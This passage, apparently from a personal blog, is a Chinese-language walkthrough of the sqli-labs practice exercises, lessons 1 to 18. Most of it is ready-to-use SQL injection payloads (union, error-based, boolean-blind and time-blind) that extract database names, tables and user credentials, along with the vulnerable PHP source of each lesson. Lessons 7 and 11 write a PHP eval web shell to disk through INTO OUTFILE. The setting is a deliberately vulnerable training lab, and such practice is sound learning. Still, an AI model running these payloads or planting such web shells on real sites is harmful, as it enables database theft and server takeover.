","date":"2022-03-23T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/leetbook_basic_algorithm/","title":"LeetBook Basic Algorithm"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt;\nSqli-labs: Basic Challenges Basic lesson 1 确认存在注入 http://localhost/sqli/Less-1/?id=1' http://localhost/sqli/Less-1/?id=1\u0026rsquo;\u0026ndash;+\n确认query语句请求列数 http://localhost/sqli/Less-1/?id=1\u0026rsquo; order by 3\u0026ndash;+\n爆数据库 数据库 http://localhost/sqli/Less-1/?id=-1\u0026rsquo; union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata\u0026ndash;+ 表 http://localhost/sqli/Less-1/?id=-1\u0026rsquo; union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where table_schema=\u0026ldquo;security\u0026rdquo;\u0026ndash;+\n列 http://localhost/sqli/Less-1/?id=-1\u0026rsquo; union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name=\u0026ldquo;users\u0026rdquo;\u0026ndash;+\n得到数据 http://localhost/sqli/Less-1/?id=-1\u0026rsquo; union select 1,username,password from users where id=2\u0026ndash;+\nlesson 2 \u0026lsquo;无法闭合，说明要求是一个INT型变量 因此将所有单引号去掉之后，一切照旧\nlesson 3 ?id=\u0026lsquo;得到报错： MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at line 1 说明存在一个)需要闭合 将注入点都改为 ?id=-1\u0026rsquo;)即可\nlesson 4 ?id=-1\u0026quot;)\nlesson 5 盲注\n报错注入\nupdatexml()\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- - http://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e,version(),0x7e),3)-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;security\u0026#34;),0x7e,version(),0x7e),3)-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;user\u0026#34;),0x7e,version(),0x7e),3)-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select concat_ws(\u0026#39;:\u0026#39;, username, password) from users limit 0, 1),0x7e,version(),0x7e),3)-- - extractvalue()\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))-- - http://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e,version(),0x7e))-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;security\u0026#34;),0x7e,version(),0x7e))-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;user\u0026#34;),0x7e,version(),0x7e))-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,(select concat_ws(\u0026#39;:\u0026#39;, username, password) from users limit 0, 1),0x7e,version(),0x7e))-- - 主键重复\n?id=1\u0026rsquo; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a\u0026ndash;+ 爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - #Subquery returns more than 1 row http://localhost/sqli/Less-5/ ?id=1\u0026#39;and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;security\u0026#34;),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - ?id=1\u0026#39;and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - 爆列名\n?id=1\u0026#39;and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=\u0026#34;user\u0026#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and (select 1 from (select count(*),concat((select concat_ws(\u0026#39;:\u0026#39;, username, password) from users limit 0, 1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - 布尔盲注\nleft()\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and left(database(), 1)\u0026lt;\u0026#39;s\u0026#39;-- - http://localhost/sqli/Less-5/ ?id=1\u0026#39; and left((select schema_name from information_schema.schemata limit 0,1), 1)\u0026lt;\u0026#39;s\u0026#39;-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and left((select table_name from information_schema.tables where table_schema = \u0026#34;security\u0026#34; limit 0,1), 1)\u0026lt;\u0026#39;a\u0026#39;-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and left((select column_name from information_schema.columns where table_name = \u0026#34;users\u0026#34; limit 0,1), 1)\u0026lt;\u0026#39;a\u0026#39;-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and left((select username from users limit 0,1), 1)\u0026lt;\u0026#39;z\u0026#39;-- - substr() \u0026amp; ascii()\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select schema_name from information_schema.schemata limit 0, 1),1,1)) \u0026lt; 80-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0, 1),1,1)) \u0026lt; 80-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0, 1),1,1)) \u0026gt; 80-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select username from users limit 0, 1),1,1)) \u0026lt; 50-- - regexp\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and 1=(select 1 from information_schema.schemata where schema_name regexp \u0026#39;^security\u0026#39; limit 0,1)-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and 1=(select 1 from information_schema.tables where table_schema = \u0026#34;security\u0026#34; and table_name regexp \u0026#39;^users\u0026#39; limit 1,1)-- - 爆列名\n?id=1\u0026#39; and 1=(select 1 from information_schema.columns where table_name=\u0026#39;users\u0026#39; and column_name regexp \u0026#39;^username\u0026#39; limit 0,1)-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and 1=(select 1 from users where username regexp \u0026#39;^dumb\u0026#39; limit 1,1)-- - like\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and ((select schema_name from information_schema.schemata limit 0,1) like \u0026#39;i%\u0026#39;)-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and ((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1) like \u0026#39;x%\u0026#39;)-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and ((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0,1) like \u0026#39;id%\u0026#39;)-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and ((select username from users limit 0,1) like \u0026#39;dumb%\u0026#39;)-- - ORD() and MID()\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ORD(MID((select schema_name from information_schema.schemata limit 0,1),1,1))\u0026lt;68-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ORD(MID((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1),1,1))\u0026gt;68-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ORD(MID((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0,1),1,1))\u0026lt;68-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))\u0026gt;68-- - 延时注入\n?id=1\u0026rsquo;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(\u0026lsquo;MSG\u0026rsquo;,\u0026lsquo;by 5 seconds\u0026rsquo;)),null)),2,3 FROM (select database() as current) as tb1\u0026ndash;+\nsleep()\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select schema_name from information_schema.schemata limit 2,1), 1, 1))=115),sleep(5),0)-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1), 1, 1))=101),sleep(5),0)-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0,1), 1, 1))=105),sleep(5),0)-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),sleep(5),0)-- - benchmark()\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select schema_name from information_schema.schemata limit 2,1), 1, 1))=115),benchmark(5000000000000000, sha(1),0)-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1), 1, 1))=101),benchmark(5000000000000000, sha(1),0)-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0,1), 1, 1))=105),benchmark(5000000000000000, sha(1),0)-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- - 笛卡尔积(heavy query)\n爆库名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select schema_name from information_schema.schemata limit 0, 1),1,1)) \u0026lt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- - 爆表名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0, 1),1,1)) \u0026lt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- - 爆列名\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0, 1),1,1)) \u0026gt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- - 爆数据\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select username from users limit 0, 1),1,1)) \u0026lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- - lesson 6 看源码\n$id = \u0026#39;\u0026#34;\u0026#39;.$id.\u0026#39;\u0026#34;\u0026#39;; $sql=\u0026#34;SELECT * FROM users WHERE id=$id LIMIT 0,1\u0026#34;; 与lesson 5的区别就在于这里用双引号包裹了id，所以要用\u0026quot;逃逸\n?id=1\u0026#34; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- - lesson 7 看源码,发现是 ')) 闭合\n$sql=\u0026#34;SELECT * FROM users WHERE id=((\u0026#39;$id\u0026#39;)) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); 根据题目提示 \u0026ldquo;Use outfile\u0026rdquo;,我们通过写入一句话木马来实现\n这里有两种思路，一种是把查询的数据通过 into outfile 存放到文件当中，然后直接访问得到查询结果\n?id=1\u0026#39;)) union select 1,2,3 into outfile \u0026#34;[absolute path]/test.txt\u0026#34; 另一种是通过写入一句话木马，然后利用菜刀或者蚁剑进行连接\n?id=1\u0026#39;)) union select 1,2,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;mima\u0026#34;])?\u0026gt;\u0026#39; into outfile \u0026#34;[absolute path]/test.php\u0026#34; -- - lesson 8 看源码\n$sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; //echo \u0026#39;You are in...........\u0026#39;; //print_r(mysqli_error($con1)); //echo \u0026#34;You have an error in your SQL syntax\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size= 3\u0026gt;\u0026#39;; } 用单引号闭合 ' ，但是报错被注视掉了因此考虑使用盲注\n?id=-1\u0026#39; or if(ascii(substr(database(),1,1))\u0026gt;115,sleep(5), 0)-- - lesson 9 看源码\n$sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; //print_r(mysqli_error($con1)); //echo \u0026#34;You have an error in your SQL syntax\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size= 3\u0026gt;\u0026#39;; } 发现与less-8基本一致，因此同样适用延时盲注\n?id=-1\u0026#39; or if(ascii(substr(database(),1,1))\u0026gt;115,sleep(5), 0)-- - lesson 10 看源码\n$id = \u0026#39;\u0026#34;\u0026#39;.$id.\u0026#39;\u0026#34;\u0026#39;; $sql=\u0026#34;SELECT * FROM users WHERE id=$id LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font size=\u0026#34;5\u0026#34; color=\u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;You are in...........\u0026#39;; //print_r(mysqli_error($con1)); //echo \u0026#34;You have an error in your SQL syntax\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size= 3\u0026gt;\u0026#39;; } 这里发现对于id进行处理，使用了双引号=\u0026quot;\u0026quot;= 进行包裹，因此修改一下injection payload就可以了，同样也是延时注入\n?id=-1\u0026#39; or if(ascii(substr(database(),1,1))\u0026gt;115,sleep(5), 0)-- - lesson 11 观察源码\n不同于前几题，这里获取的是POST的值\nuname \u0026amp; passwd 的地位一致，都没有进行额外的处理\nif(isset($_POST[\u0026#39;uname\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;passwd\u0026#39;])) { $uname=$_POST[\u0026#39;uname\u0026#39;]; $passwd=$_POST[\u0026#39;passwd\u0026#39;]; //logging the connection parameters to a file for analysis. $fp=fopen(\u0026#39;result.txt\u0026#39;,\u0026#39;a\u0026#39;); fwrite($fp,\u0026#39;User Name:\u0026#39;.$uname); fwrite($fp,\u0026#39;Password:\u0026#39;.$passwd.\u0026#34;\\n\u0026#34;); fclose($fp); // connectivity @$sql=\u0026#34;SELECT username, password FROM users WHERE username=\u0026#39;$uname\u0026#39; and password=\u0026#39;$passwd\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) { //echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 4\u0026gt;\u0026#39;; //echo \u0026#34; You Have successfully logged in\\n\\n \u0026#34; ; echo \u0026#39;\u0026lt;font size=\u0026#34;3\u0026#34; color=\u0026#34;#0000ff\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Login name:\u0026#39;. $row[\u0026#39;username\u0026#39;]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password:\u0026#39; .$row[\u0026#39;password\u0026#39;]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/flag.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size=\u0026#34;3\u0026#34;\u0026gt;\u0026#39;; //echo \u0026#34;Try again looser\u0026#34;; print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/slap.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } } 同时使用 1' 查看报错 可知需要escape 一个单引号\n文件写入 uname = 1\u0026#39; union select 1,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;mima\u0026#34;])?\u0026gt;\u0026#39; into outfile \u0026#34;[Absoute path]/test.php\u0026#34;-- - 报错注入 uname = 1\u0026#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- - 延时注入 uname = -1\u0026#39; or if(substr(database(),1,1)\u0026gt;\u0026#39;a\u0026#39;, sleep(5), 1)-- - 布尔注入 uname = -1\u0026#39; or left(database(),1)\u0026gt;\u0026#39;a\u0026#39;-- - lesson 12 // connectivity $uname=\u0026#39;\u0026#34;\u0026#39;.$uname.\u0026#39;\u0026#34;\u0026#39;; $passwd=\u0026#39;\u0026#34;\u0026#39;.$passwd.\u0026#39;\u0026#34;\u0026#39;; @$sql=\u0026#34;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); 也可以手工测试 此时 1' 没有起到闭合的作用，因此什么都没有发生 尝试 1\u0026quot; ,报错，此时闭合了一个双引号，还需要escape括号\n双引号 (\u0026quot;\u0026quot;) 包裹，其他与lesson11一致，不再赘述\n报错注入 1\u0026#34;)and extractvalue(1, concat(0x7e, database(), 0x7e))-- - 1\u0026#34;)and updatexml(1,concat(0x7e, user(), 0x7e, database(), 0x7e),3)-- - 布尔注入 1\u0026#34;) or left(database(),1)\u0026gt;\u0026#39;a\u0026#39;-- - 延时注入 1\u0026#34;) or if(substr(database(),1,1)\u0026gt;\u0026#39;a\u0026#39;,sleep(5), 1)-- - 常规注入 1\u0026#34;) union select 1, concat_ws(\u0026#34;:\u0026#34;, username, password) from users-- - lesson 13 看源码\n@$sql=\u0026#34;SELECT username, password FROM users WHERE username=(\u0026#39;$uname\u0026#39;) and password=(\u0026#39;$passwd\u0026#39;) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); 同样也可以手工测试\n1' 报错， 1\u0026quot; 不报错\n可以确定，与前面两题类似，只是用 ('') 包裹，同时报错被注释了，不再赘述\nlesson 14 看源码\n$uname=\u0026#39;\u0026#34;\u0026#39;.$uname.\u0026#39;\u0026#34;\u0026#39;; $passwd=\u0026#39;\u0026#34;\u0026#39;.$passwd.\u0026#39;\u0026#34;\u0026#39;; @$sql=\u0026#34;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); 手工测试 1\u0026quot; 报错 确认由=\u0026quot;\u0026quot;= 包裹，不再赘述\nlesson 15 看源码\n@$sql=\u0026#34;SELECT username, password FROM users WHERE username=\u0026#39;$uname\u0026#39; and password=\u0026#39;$passwd\u0026#39; LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); else { echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size=\u0026#34;3\u0026#34;\u0026gt;\u0026#39;; //echo \u0026#34;Try again looser\u0026#34;; //print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/slap.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } 这里注释掉了error，因此只能依靠盲注\n首先想办法闭合\n1\u0026#39; or 1=1-- - #成功闭合 1\u0026#34; or 1=1-- - #闭合失败 了解是 '' 包裹，接下来开始盲注\n布尔盲注 -1\u0026#39; or left(database(),1)\u0026gt;\u0026#39;a\u0026#39;-- - -1\u0026#39; or ascii(substr(database(),1,1))\u0026gt;\u0026#34;92\u0026#34;-- - 2. 报错盲注（报错被禁用了）\n延时盲注 -1\u0026#39;or if(left(database(),1)\u0026gt;\u0026#39;a\u0026#39;,sleep(5),1)-- - lesson 16 看源码\n$uname=\u0026#39;\u0026#34;\u0026#39;.$uname.\u0026#39;\u0026#34;\u0026#39;; $passwd=\u0026#39;\u0026#34;\u0026#39;.$passwd.\u0026#39;\u0026#34;\u0026#39;; @$sql=\u0026#34;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); else { echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size=\u0026#34;3\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; //echo \u0026#34;Try again looser\u0026#34;; //print_r(mysqli_error($con1)); echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;../images/slap.jpg\u0026#34; /\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } 先手工测试一下=1\u0026rsquo;= 1\u0026quot; 均没有报错，结合源码得知报错被禁用 尝试闭合\n-1\u0026#39; or 1=1-- - -1\u0026#34; or 1=1-- - -1\u0026#39;) or 1=1-- - -1\u0026#34;) or 1=1-- - #成功 布尔盲注 -1\u0026#34;) or left(database(),1)\u0026gt;\u0026#39;a\u0026#39;-- - -1\u0026#34;) or ascii(substr(database(),1,1))\u0026gt;\u0026#34;92\u0026#34;-- - 2. 报错盲注（报错被禁用了）\n延时盲注 -1\u0026#34;)or if(left(database(),1)\u0026gt;\u0026#39;a\u0026#39;,sleep(5),1)-- - lesson 17 直接看源码，我们之前提到过，有对数据库操作的地方就有可能会发生注入，那在lesson 17当中，我们发现服务端进行了两次数据库操作，一次SELECT，一次UPDATE，那到底是不是两个都存在注入呢？\n$uname=check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); $passwd=$_POST[\u0026#39;passwd\u0026#39;]; //logging the connection parameters to a file for analysis. $fp=fopen(\u0026#39;result.txt\u0026#39;,\u0026#39;a\u0026#39;); fwrite($fp,\u0026#39;User Name:\u0026#39;.$uname.\u0026#34;\\n\u0026#34;); fwrite($fp,\u0026#39;New Password:\u0026#39;.$passwd.\u0026#34;\\n\u0026#34;); fclose($fp); // connectivity @$sql=\u0026#34;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\u0026#34;; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); //echo $row; if($row) { //echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34;\u0026gt;\u0026#39;; $row1 = $row[\u0026#39;username\u0026#39;]; //echo \u0026#39;Your Login name:\u0026#39;. $row1; $update=\u0026#34;UPDATE users SET password = \u0026#39;$passwd\u0026#39; WHERE username=\u0026#39;$row1\u0026#39;\u0026#34;; mysqli_query($con1, $update); //echo $update; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; ...... 很明显不是的，这里的 $uname 无法被很好地被我们利用，原因是服务端对 $uname 进行了过滤 check_input(): 首先用 substr() 限制了变量的长度，让我们无法放置很长的查询语句 PHP默认会所有的 GET, POST, COOKIE 数据自动执行 addslashes() 函数，旨在预定义字符添加反斜杠字符串：\n单引号（\u0026rsquo;） 双引号（\u0026quot;） 反斜杠（\\） NULL 但是保险起见，我们使用 get_magic_quotes_gpc() 检测自动转义是否开启，因为如果已经转义过了，我们手动转义就会出现问题。 接下来，为了存储得到实际的值，我们使用 stripslashes() 方法删除用于转义的反斜杠\n我们知道在数据库中，字符串需要用引号包裹，因此我们用 ctype_digit() 检测是否为纯数字，如果为字符串则增加引号。 这里的 mysqli_real_escape_string() 方法再次转义所有特殊字符： \\x00, \\n, \\r, \\, \u0026lsquo;, \u0026quot; and \\x1a.\nfunction check_input($con1, $value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = \u0026#34;\u0026#39;\u0026#34; . mysqli_real_escape_string($con1, $value) . \u0026#34;\u0026#39;\u0026#34;; } else { $value = intval($value); } return $value; } // take the variables if(isset($_POST[\u0026#39;uname\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;passwd\u0026#39;])) { //making sure uname is not injectable $uname=check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); 因此我们无法利用 $uname ，因为所有特殊字符都被转义导致无法逃逸，只能利用 UPDATE 语句中的 $passwd,用报错注入或者延时注入都可以实现，与 SELECT 一致\nuname=admin\u0026amp;passwd=11\u0026#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))-- -\u0026amp;submit=Submit lesson 18 根据提示IP 地址有所限制，判断可能是对于HTTP header有所要求，查看源码\n$uname = check_input($con1, $_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($con1, $_POST[\u0026#39;passwd\u0026#39;]); ...... $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\u0026#34;; $result1 = mysqli_query($con1, $sql); $row1 = mysqli_fetch_array($result1, MYSQLI_BOTH); if($row1) { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 3 \u0026gt;\u0026#39;; $insert=\u0026#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;, $uname)\u0026#34;; mysqli_query($con1, $insert); //echo \u0026#39;Your IP ADDRESS is: \u0026#39; .$IP; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; //echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size = 3 \u0026gt;\u0026#39;; 